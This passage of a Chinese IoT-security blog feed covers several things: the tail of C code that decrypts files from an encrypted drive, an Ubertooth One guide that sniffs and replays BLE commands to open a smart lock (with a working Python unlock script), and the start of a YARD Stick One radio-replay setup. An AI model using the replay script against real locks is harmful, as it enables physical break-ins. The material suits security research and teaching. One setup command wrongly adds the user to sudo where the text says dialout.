class="literal">NULL</span>;</span><br><span class="line">    content = (<span class="keyword">char</span>*)<span class="built_in">calloc</span>(fileLen + <span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">    <span class="keyword">if</span> (content == <span class="literal">NULL</span>)<span class="comment">//申请后判定是否申请成功</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fseek(pFile, <span class="number">0</span>, SEEK_SET);  <span class="comment">//首先移动到文件开头再读取</span></span><br><span class="line">    fread_s(content, fileLen + <span class="number">1</span>, fileLen, <span class="number">1</span>, pFile);</span><br><span class="line">    fclose(pFile);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 调用解密函数，或解密首部 0x1000 字节</span></span><br><span class="line">    <span class="keyword">if</span> (!enc_fun(content, md5, encSize))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"解密失败\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 是否需要解密尾部 0x1000 字节</span></span><br><span class="line">    <span class="keyword">if</span> (enctail)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 解密尾部 0x1000 字节</span></span><br><span class="line">        <span class="keyword">char</span>* tailcont = content + fileLen - <span class="number">0x1000</span>;</span><br><span class="line">        <span class="keyword">if</span> (!enc_fun(tailcont, md5, encSize)) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"解密失败\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//printf("写入新文件\n");</span></span><br><span class="line">    <span class="keyword">int</span> nlen = <span class="built_in">strlen</span>(pfilename);</span><br><span class="line">    pfilename[nlen - <span class="number">4</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    FILE* pfile = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (fopen_s(&amp;pfile, pfilename, <span class="string">"wb"</span>) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"创建文件失败\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fwrite(content, fileLen, <span class="number">1</span>, pfile);</span><br><span class="line">    fclose(pfile);</span><br><span class="line">    <span class="built_in">free</span>(content);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"解密文件写入成功!!!\n\n"</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;智能设备的加密安全篇&lt;/p&gt;
&lt;h2 id=&quot;某家存储网络硬盘的漏洞&quot;&gt;&lt;a href=&quot;#某家存储网络硬盘的漏洞&quot; class=&quot;head
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="移动硬盘破解" scheme="http://yaseng.org/tags/%E7%A7%BB%E5%8A%A8%E7%A1%AC%E7%9B%98%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="智能硬盘破解" scheme="http://yaseng.org/tags/%E6%99%BA%E8%83%BD%E7%A1%AC%E7%9B%98%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="固态加密硬盘破解" scheme="http://yaseng.org/tags/%E5%9B%BA%E6%80%81%E5%8A%A0%E5%AF%86%E7%A1%AC%E7%9B%98%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="u 盘破解" scheme="http://yaseng.org/tags/u-%E7%9B%98%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="录音笔破解" scheme="http://yaseng.org/tags/%E5%BD%95%E9%9F%B3%E7%AC%94%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>Ubertooth One 使用系列 (一) — 破解蓝牙锁</title>
    <link href="http://yaseng.org/ubertoothone-1.html"/>
    <id>http://yaseng.org/ubertoothone-1.html</id>
    <published>2020-10-24T16:00:00.000Z</published>
    <updated>2020-11-04T08:46:26.020Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Ubertooth-One-嗅探开启蓝牙锁"><a href="#Ubertooth-One-嗅探开启蓝牙锁" class="headerlink" title="Ubertooth One 嗅探开启蓝牙锁"></a>Ubertooth One 嗅探开启蓝牙锁</h2><p>根据 Ubertooth 的 wiki（<a href="https://github.com/greatscottgadgets/ubertooth/wiki/Build-Guide），在构建" target="_blank" rel="noopener">https://github.com/greatscottgadgets/ubertooth/wiki/Build-Guide），在构建</a> libbtbb 和 Ubertooth 工具之前，需要先安装一些依赖。可以从操作系统的软件包存储库中找到许多这些文件，例如：</p><h3 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h3><p>这里我是在树莓派（Debian / Ubuntu）下进行安装，根据个人的系统来执行相应的命令：</p><p><strong>Debian / Ubuntu</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install cmake libusb-1.0-0-dev make gcc g++ libbluetooth-dev \</span><br><span class="line">pkg-config libpcap-dev python-numpy python-pyside python-qt4</span><br></pre></td></tr></table></figure><p><strong>Fedora / Red Hat</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su -c &quot;yum install libusb1-devel make gcc wget tar bluez-libs-devel&quot;</span><br></pre></td></tr></table></figure><h2 id="安装-libbtbb"><a href="#安装-libbtbb" class="headerlink" title="安装 libbtbb"></a>安装 libbtbb</h2><p>接下来，需要为Ubertooth工具构建蓝牙基带库（libbtbb），以解码蓝牙数据包：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/greatscottgadgets/libbtbb/archive/2018-12-R1.tar.gz -O libbtbb-2018-12-R1.tar.gz</span><br><span class="line">tar -xf libbtbb-2018-12-R1.tar.gz</span><br><span class="line"><span class="built_in">cd</span> libbtbb-2018-12-R1</span><br><span class="line">mkdir build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h2 id="安装-Ubertooth-tools"><a href="#安装-Ubertooth-tools" class="headerlink" title="安装 Ubertooth tools"></a>安装 Ubertooth tools</h2><p>Ubertooth存储库包含用于嗅探蓝牙数据包，配置Ubertooth和更新固件的主机代码。使用以下方法构建和安装的：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/greatscottgadgets/ubertooth/releases/download/2018-12-R1/ubertooth-2018-12-R1.tar.xz</span><br><span class="line">tar xf ubertooth-2018-12-R1.tar.xz</span><br><span class="line"><span class="built_in">cd</span> ubertooth-2018-12-R1/host</span><br><span class="line">mkdir build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p><strong>查看 Ubertooth one 固件版本</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ubertooth-util -v     // Ubertooth one 固件版本</span><br><span class="line">$ ubertooth-rx -V            // ubertooth tools 版本</span><br><span class="line">libubertooth 1.1 (2018-12-R1), libbtbb 1.0 (2018-06-R1)</span><br></pre></td></tr></table></figure><p><strong>Linux 用户</strong>: 如果是第一次安装，或者收到有关查找库的错误：</p><blockquote><p>ubertooth-util: error while loading shared libraries: libubertooth.so.1: cannot open shared object file: No such file or directory</p></blockquote><p>则应运行 sudo ldconfig：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ldconfig</span><br><span class="line">$ sudo ubertooth-util -v</span><br><span class="line">Firmware version: 2018-12-R1 (API:1.06)</span><br></pre></td></tr></table></figure><h2 id="安装-Wireshark"><a href="#安装-Wireshark" class="headerlink" title="安装 Wireshark"></a>安装 Wireshark</h2><p>Wireshark版本1.12和更高版本默认包含Ubertooth BLE插件。<a href="https://github.com/greatscottgadgets/ubertooth/wiki/Capturing-BLE-in-Wireshark" target="_blank" rel="noopener">只需</a>做一些工作，就可以将<a href="https://github.com/greatscottgadgets/ubertooth/wiki/Capturing-BLE-in-Wireshark" target="_blank" rel="noopener">Ubertooth中的BLE直接捕获到Wireshark中</a>。</p><p>利用Wireshark BTBB和BR / EDR插件，可以在Wireshark GUI中分析和剖析使用Kismet捕获的蓝牙基带流量。它们与其余的Ubertooth和libbtbb软件分开构建。</p><p>传递给cmake的目录<code>MAKE_INSTALL_LIBDIR</code>因系统而异，但应为现有Wireshark插件（例如<code>asn1.so</code>和）的位置<code>ethercat.so</code>。在macOS上，这是可能的<code>/Applications/Wireshark.app/Contents/PlugIns/wireshark/</code>。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install wireshark wireshark-dev libwireshark-dev cmake</span><br><span class="line"><span class="built_in">cd</span> libbtbb-2018-12-R1/wireshark/plugins/btbb</span><br><span class="line">mkdir build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">cmake -DCMAKE_INSTALL_LIBDIR=/usr/lib/arm-linux-gnueabihf/wireshark/plugins/ ..</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>然后为BT BR / EDR插件重复上述步骤：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install wireshark wireshark-dev libwireshark-dev cmake</span><br><span class="line"><span class="built_in">cd</span> libbtbb-2018-12-R1/wireshark/plugins/btbredr</span><br><span class="line">mkdir build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">cmake -DCMAKE_INSTALL_LIBDIR=/usr/lib/arm-linux-gnueabihf/wireshark/plugins/ ..</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h3 id="在Wireshark中捕获BLE"><a href="#在Wireshark中捕获BLE" class="headerlink" title="在Wireshark中捕获BLE"></a>在Wireshark中捕获BLE</h3><p>可以构建使用 Wireshark 在 Wireshark 中捕获BLE。</p><ol><li><p>运行命令： <code>mkfifo /tmp/pipe</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pi@raspberrypi:~/ubertooth $ mkfifo /tmp/pipe</span><br></pre></td></tr></table></figure></li><li><p>新建一个终端窗口，打开 Wireshark</p></li><li><p>单击<strong>捕获</strong>（Capture ）-&gt;<strong>选项</strong>（Options）</p></li><li><p>点击窗口右侧的<strong>管理接口</strong>（Manage Interfaces）按钮</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201021151624454.png" alt="image-20201021151624454"></p></li><li><p>在<strong>管道</strong>（Pipe）文本框中，键入“ /tmp/pipe”</p></li><li><p>单击OK保存</p></li><li><p>点击“开始”</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201021151956105.png" alt="image-20201021151956105"></p></li></ol><p>在终端中，运行<code>ubertooth-btle</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubertooth-btle -f -c /tmp/pipe</span><br></pre></td></tr></table></figure><p>在 Wireshark 窗口中，可以看到数据包滚动。</p><p><strong>注意</strong>：如果碰到 <a href="https://github.com/greatscottgadgets/ubertooth/issues/61" target="_blank" rel="noopener">User encapsulation not handled: DLT=147, check your Preferences-&gt;Protocols-&gt;DLT_USER</a>  错误，如图</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201021153531929.png" alt="image-20201021153531929"></p><p>所需步骤是：</p><ol><li><p>单击编辑（Edit）-&gt;首选项（Preferences）</p></li><li><p>单击协议（Protocols）-&gt; DLT_USER</p></li><li><p>单击编辑（封装表）</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201021153847204.png" alt="image-20201021153847204"></p></li><li><p>点击加号（+）</p></li><li><p>在DLT下，选择“用户0（DLT = 147）”（如果错误消息显示的DLT号与147不同，请适当调整此选择）</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201021154238969.png" alt="image-20201021154238969"></p></li><li><p>在有效载荷协议下，输入：btle</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201021154336154.png" alt="image-20201021154336154"></p></li><li><p>点击OK</p></li><li><p>点击OK</p></li></ol><h2 id="使用-Ubertooth-One-嗅探与重放数据"><a href="#使用-Ubertooth-One-嗅探与重放数据" class="headerlink" title="使用 Ubertooth One 嗅探与重放数据"></a>使用 Ubertooth One 嗅探与重放数据</h2><p>现有一个BLE 设备的蓝牙锁，接下来使用 Ubertooth One 嗅探抓包，然后再数据重放。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/640.webp" alt="img" style="zoom:50%;"></p><p>在树莓派命令终端下（需加一个蓝牙适配器），输入<code>hciconfig dev</code>查看电脑的当前适配器设备，输入<code>sudo hciconfig hci0 up</code>激活蓝牙适配器。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201030140346860.png" alt="image-20201030140346860"></p><p>激活蓝牙锁后，输入<code>sudo hcitool lescan</code>搜索周围的蓝牙设备，搜索到设备后按<code>CTRL + C</code>停止搜索，设备名称为<code>smart lock</code>，是一个蓝牙串口设备，MAC地址<code>74:e1:82:04:53:3f</code>。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201030140627147.png" alt="image-20201030140627147"></p><p>获取到蓝牙锁的 MAC 地址后，我们可以指定嗅探 MAC 进行抓包，命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubertooth-btle -f -t 74:e1:82:04:53:3f -c /tmp/pipe</span><br></pre></td></tr></table></figure><p>Wireshark 的步骤和之前是一样的，选择管道接口<code>/tmp/pipe</code>。准备完毕之后，我们先用手机连接蓝牙锁，正常开启一遍，随后 Wireshark 出现滚动的数据包 。</p><p>使用显示过滤器，可以显示仅连接请求和非零数据包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">btle.data_header.length &gt; 0 || btle.advertising_header.pdu_type == 0x05</span><br></pre></td></tr></table></figure><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201030133816824.png" alt="image-20201030133816824"></p><p>仅属性读取响应，写入请求和通知，我们只关注写入请求的包，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">btatt.opcode in &#123; 0x0b 0x12 0x1b &#125;</span><br></pre></td></tr></table></figure><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201030134225353.png" alt="image-20201030134225353"></p><p>现在一共抓到三个写入请求的包，其 Master Address 值为 68:df:dd:72:16:ee（小米手机蓝牙 MAC），Slave Address 为蓝牙锁 MAC。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201030134109771.png" alt="image-20201030134109771"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201030134133320.png" alt="image-20201030134133320"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201030134304295.png" alt="image-20201030134304295"></p><p>抓到包后，使用 gatttool 与 BLE 设备蓝牙锁进行通讯。</p><p>输入命令<code>gatttool -b 74:e1:82:04:53:3f -I</code>使用interactive方式连接设备。</p><p>help 打印帮助信息：</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201030141058132.png" alt="image-20201030141058132"></p><blockquote><p>>connect              与BLE设备连接。</p><p>>primary              寻找BLE中可用的服务。</p><p>>characteristics          查看设备服务的特征值。</p><p>>char-read-hnd 0x0026       读取特征值对应句柄的数值。</p><p>>char-write-req 0x0029 55100144  发送55100144命令到句柄0x0029（控制挂锁开锁）</p><p>>sec-level high          设置安全等级为高，可以让手环长时间保持连接。</p></blockquote><p>激活蓝牙锁之后，首先执行 connect 命令建立通讯，随后依次写入请求。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201030142646314.png" alt="image-20201030142646314"></p><p>执行以上操作后，蓝牙锁开启成功。</p><p>python 脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#usage: pip install pwn</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">argv = [<span class="string">"gatttool"</span>,<span class="string">"-b"</span>,<span class="string">"74:e1:82:04:53:3f"</span>,<span class="string">"-I"</span>]</span><br><span class="line">sh = process(argv)</span><br><span class="line">sh.sendline(<span class="string">"connect"</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'-----请开启锁-----'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Connection successful"</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'-----正在开锁-----'</span>)</span><br><span class="line">sh.sendline(<span class="string">"char-write-req 0x0026 0100"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"written successfully"</span>)</span><br><span class="line">sh.sendline(<span class="string">"char-write-req 0x0029 554100000014"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"written successfully"</span>)</span><br><span class="line">sh.sendline(<span class="string">"char-write-req 0x0029 55100144"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"written successfully"</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'-----开锁成功-----'</span>)</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><p>参考：</p><p>ubertooth – <a href="https://github.com/greatscottgadgets/ubertooth/wiki/Build-Guide" target="_blank" rel="noopener">https://github.com/greatscottgadgets/ubertooth/wiki/Build-Guide</a><br>BG7YWL 重放破解蓝牙锁  – <a href="https://www.cnblogs.com/k1two2/p/5577301.html" target="_blank" rel="noopener">https://www.cnblogs.com/k1two2/p/5577301.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Ubertooth-One-嗅探开启蓝牙锁&quot;&gt;&lt;a href=&quot;#Ubertooth-One-嗅探开启蓝牙锁&quot; class=&quot;headerlink&quot; title=&quot;Ubertooth One 嗅探开启蓝牙锁&quot;&gt;&lt;/a&gt;Ubertooth One 嗅探开启蓝牙锁&lt;/
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="锁具安全" scheme="http://yaseng.org/tags/%E9%94%81%E5%85%B7%E5%AE%89%E5%85%A8/"/>
    
      <category term="Ubertooth One" scheme="http://yaseng.org/tags/Ubertooth-One/"/>
    
      <category term="重放攻击" scheme="http://yaseng.org/tags/%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB/"/>
    
      <category term="蓝牙锁破解" scheme="http://yaseng.org/tags/%E8%93%9D%E7%89%99%E9%94%81%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>YARD Stick One 使用系列 (一)</title>
    <link href="http://yaseng.org/yardstickone-1.html"/>
    <id>http://yaseng.org/yardstickone-1.html</id>
    <published>2020-09-16T16:00:00.000Z</published>
    <updated>2020-10-14T06:39:19.972Z</updated>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><a href="https://greatscottgadgets.com/yardstickone/" target="_blank" rel="noopener">YARD Stick One</a> 是一款低于 1 GHz 以下的 USB 无线收发器，基于德州仪器（TI）CC1111。它与 <a href="http://ossmann.blogspot.com/2010/03/16-pocket-spectrum-analyzer.html" target="_blank" rel="noopener">IM-Me</a> 相同的无线电电路。现在，当你通过 USB 将 YARD Stick One 连接到计算机时，可以轻松定制 IM-Me 固件的无线电功能。你可以将 YARD Stick One 用于进行各种遥控信号的重放，汽车遥控锁的安全研究等。主要性能规格如下：</p><ul><li>半双工发送和接收</li><li>官方工作频率：300-348 MHz，391-464 MHz 和 782-928 MHz</li><li>非官方工作频率：281-361 MHz，378-481 MHz 和 749-962 MHz</li><li>调制方式：ASK，OOK，GFSK，2-FSK，4-FSK，MSK</li><li>数据速率高达 500 kbps</li><li>全速 USB 2.0</li></ul><p>YARD Stick One 带有 <a href="https://github.com/atlas0fd00m/rfcat" target="_blank" rel="noopener">RfCat</a> 安装的固件，由 <a href="https://twitter.com/at1as" target="_blank" rel="noopener">atlas</a> 提供。RfCat 允许从交互式 Python Shell 或计算机上运行的自己的程序控制无线收发器。YARD Stick One 还安装了<a href="https://github.com/AdamLaurie/CC-Bootloader" target="_blank" rel="noopener">CC Bootloader</a>，因此你可以升级 RFCat 或安装自己的固件，而无需任何其他编程硬件。不包括天线。建议将<a href="https://www.greatscottgadgets.com/ant500/" target="_blank" rel="noopener">ANT500</a> 用作 YARD Stick One 的启动天线。</p><p>YARD Stick One 最初基于 <a href="https://www.greatscottgadgets.com/tc14badge/" target="_blank" rel="noopener">ToorCon 14 Badge</a> 设计，具有 CC1111 平台以前没有的几个功能：</p><ul><li>SMA 母天线连接器，用于 <a href="https://www.greatscottgadgets.com/ant500/" target="_blank" rel="noopener">ANT500 </a>等外部天线</li><li>接收放大器，提高灵敏度</li><li>发射放大器，输出功率更高</li><li>在整个工作频率范围内均具有强大的 RF 性能</li><li>低通滤波器，用于在 800 和 900 MHz 频段工作时消除谐波</li><li>天线端口电源控制，可兼容为 <a href="https://www.greatscottgadgets.com/hackrf/" target="_blank" rel="noopener">HackRF One </a>设计的天线端口附件</li><li>兼容 <a href="http://goodfet.sourceforge.net/" target="_blank" rel="noopener">GoodFET</a> 的扩展和编程头</li><li>兼容 <a href="http://ossmann.blogspot.com/2012/10/programming-pink-pagers-in-style.html" target="_blank" rel="noopener">GIMME</a> 的编程测试点</li></ul><p>有关文档和开源设计文件，请访问<a href="https://github.com/greatscottgadgets/yardstick/wiki" target="_blank" rel="noopener">项目Wiki</a>。</p><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>以下测试环境在 ubuntu 16.04 下搭建</p><p>软件工具：RFcat、Osmocom、Inspectrum</p><p>设备：</p><p>YARD Stick One （重放信号）</p><p>RTL-SDR 电视棒 （捕获信号）</p><p>无线门铃，使用 ASK/OOK 调制的 1GHz 以下信号运行的设备。芯片是 <a href="https://datasheetspdf.com/datasheet/HS1527.html" target="_blank" rel="noopener">HS1527</a>， 发射频率为 433Mhz 。</p><h3 id="安装-rfcat"><a href="#安装-rfcat" class="headerlink" title="安装 rfcat"></a>安装 rfcat</h3><p>下载 <a href="https://github.com/atlas0fd00m/rfcat" target="_blank" rel="noopener">rfcat</a> 源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/atlas0fd00m/rfcat</span><br></pre></td></tr></table></figure><p>需要安装 python-usb，libusb-1.0.0，make 和 sdcc 依赖和库。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install python-usb libusb-1.0.0 make sdcc</span><br><span class="line">$ cd rfcat</span><br><span class="line">$ pip install -r requirements.txt</span><br></pre></td></tr></table></figure><blockquote><p>其中 PySide2 安装时可能会碰到 “ERROR: THESE PACKAGES DO NOT MATCH THE HASHES FROM THE REQUIREMENTS FILE. If you have updated the package versions, please update the hashes. Otherwise, examine the package contents carefully; someone may have tampered with them.”</p><p>可通过 wget 将 PySide2-5.15.1-5.15.1-cp27-cp27mu-manylinux1_x86_64.whl 下载到本地进行安装（pip install PySide2-5.15.1-5.15.1-cp27-cp27mu-manylinux1_x86_64.whl）。</p></blockquote><p>当加密狗显示在操作系统上时，如果你是非ROOT用户则必须具有对加密狗的读/写访问权限，对于大多数 Linux 发行版，这意味着你必须是“ dialout”组的成员。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo usermod -a -G sudo $USER</span><br><span class="line">$ su - $USER</span><br></pre></td></tr></table></figure><p>还需要永久的符号链接到 USB 串行设备，以便在需要时与 CHRONOS，DONSDONGLE或 YARDSTICKONE 引导加载程序进行通信。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo cp etc/udev/rules.d/20-rfcat.rules /etc/udev/rules.d</span><br><span class="line">$ sudo udevadm control --reload-rules</span><br></pre></td></tr></table></figure><p>安装客户端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo python setup.py install</span><br></pre></td></tr></table></figure><p>运行时，启用频谱仪发生的错误</p><blockquote><p>qt.qpa.plugin: Could not load the Qt platform plugin “xcb” in “” even though it was found.<br>This application failed to start because no Qt platform plugin could be initialized. Reinstalling the application may fix this problem.</p><p>可根据 <a href="https://blog.csdn.net/zhanghm1995/article/details/106474505" target="_blank" rel="noopener">https://blog.csdn.net/zhanghm1995/article/details/106474505</a> 提出的解决方案解决</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ export QT_DEBUG_PLUGINS=1</span><br><span class="line">$ sudo apt-get install libxcb-xinerama0</span><br></pre></td></tr></table></figure><h3 id="安装-gr-osmosdr"><a href="#安装-gr-osmosdr" class="headerlink" title="安装 gr-osmosdr"></a>安装 gr-osmosdr</h3><p>安装以后可以使用 <strong>osmocom_fft</strong> 命令进行频率录制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install gr-osmosdr</span><br></pre></td></tr></table></figure><p>运行后，界面如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ osmocom_fft</span><br></pre></td></tr></table></figure><p><img src="https://pic-1302347126.cos.ap-guangzhou.myqcloud.com/image/image-20200914163705146.png" alt="image-20200914163705146" style="zoom: 67%;"></p><h3 id="安装-inspectrum"><a href="#安装-inspectrum" class="headerlink" title="安装 inspectrum"></a>安装 inspectrum</h3><p>Inspectrum是一款分析无线信号的工具，基于Linux和OSX。它兼容GNURadio、Osmocom_fft还有各类SDR设备导出的IQ文件格式（例如RTL-SDR、HackRF、BladeRF），界面如下图。 安装 Inspectrum，可参考Wiki：<a href="https://github.com/miek/inspectrum/wiki/Build" target="_blank" rel="noopener">https://github.com/miek/inspectrum/wiki/Build</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span 